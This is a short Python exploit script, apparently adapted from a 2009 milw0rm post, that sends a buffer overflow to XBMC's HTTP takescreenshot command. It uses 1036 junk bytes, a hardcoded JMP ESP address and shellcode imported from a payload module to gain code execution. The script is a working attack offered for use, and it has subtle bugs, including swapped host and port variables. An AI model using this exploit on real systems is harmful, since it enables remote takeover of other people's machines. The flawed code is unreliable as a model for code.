#!/usr/bin/env python 
import socket
import struct
from struct import pack
from payload import buf
def shell_attack(target_machine, target_port):



    port = target_machine
    host = target_port

    Start_url =b'xbmcCmds/xbmcHttp?command=takescreenshot('
    Junk_buffer = b'A'*1036
    Jump_esp = struct.pack(b'<L',0x77F84143)

   



    End_url =b'.jpg;false;0;300;200;90)'

    # create a socket object called 'c' 
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

    # connect to the socket 
    c.connect((host, port)) 

    Request = (Start_url + Junk_buffer + Jump_esp + buf + End_url)

    # create a file-like object to read 
    fileobj = c.makefile('r', 0) 

    # Ask the server for the file 
    fileobj.write("GET /"+Request+" HTTP/1.1\n\n") 

    # milw0rm.com [2009-04-01]